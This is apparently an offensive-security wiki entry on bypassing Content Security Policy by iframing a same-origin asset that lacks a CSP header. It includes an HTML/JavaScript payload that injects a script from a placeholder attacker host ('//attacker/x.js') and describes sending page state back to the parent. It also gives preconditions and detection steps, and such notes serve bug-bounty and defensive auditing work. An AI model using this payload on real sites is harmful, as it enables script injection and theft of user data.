---
title: Iframe without CSP as proxy
slug: iframe-without-csp-proxy
created_utc: 2026-05-13T00:00:00Z
updated_utc: 2026-05-14T00:00:00Z
tags: [technique/dom-xss, technique/csp-bypass]
inbound: []
---

# Iframe without CSP as proxy

## Pattern
Even when `unsafe-inline` is allowed but external `script-src` is locked,
iframe a same-origin URL on the victim that **lacks a CSP header** — CSS
files, JS files, image assets, S3-proxied uploads, error pages, robots.txt,
analytics endpoints often omit CSP. Inside that iframe (no CSP) inject
`<script src=//attacker/x.js>`. Talk back to the parent via same-origin
to exfil page state.

## Preconditions
- `unsafe-inline` allowed (you can inject inline JS) but `script-src`
  excludes attacker domain.
- A same-origin URL on the victim that responds without `Content-Security-Policy`
  (or with a strictly weaker policy than the parent).
- The injected iframe has a way to communicate back (postMessage,
  `window.parent` same-origin access, etc.).

## Detection
- Crawl every same-origin asset and diff `Content-Security-Policy` header
  presence. CSS, JS, image, font, S3-proxied paths usually missing.
- Static assets behind a CDN reverse-proxy almost never get the CSP
  middleware.

## Triggering
```html
<!-- Inside victim page with unsafe-inline CSP -->
<script>
  const f = document.createElement('iframe');
  f.src = '/static/some-asset-no-csp.html';  // any same-origin URL without CSP
  f.onload = () => {
    f.contentDocument.body.innerHTML +=
      '<script src="//attacker/x.js"><\/script>';
  };
  document.body.appendChild(f);
</script>
```

## Bypasses
- Doesn't matter what `script-src` says — the iframe is a new browsing
  context that gets the asset's own (missing) CSP.
- `frame-ancestors` does NOT block this (it controls who can frame us, not
  who we can frame).
- `frame-src` on the parent may block; check before assuming.

## Seen in the wild
- {date: 2023, target: undisclosed via Justin Gardner} — $70K XSS chain.
- {date: 2018, target: general} — Wallarm CSP-bypass research.
- {date: 2023-11-30, source: CT Ep 47} — JG cites the same $70K XSS bug; emphasises CSP-less same-origin assets are usually also XFO-less (single reverse-proxy header rule).

## References
- Wallarm 2018 — "CSP bypass via same-origin iframe missing CSP header"
- Critical Thinking Podcast Ep 47
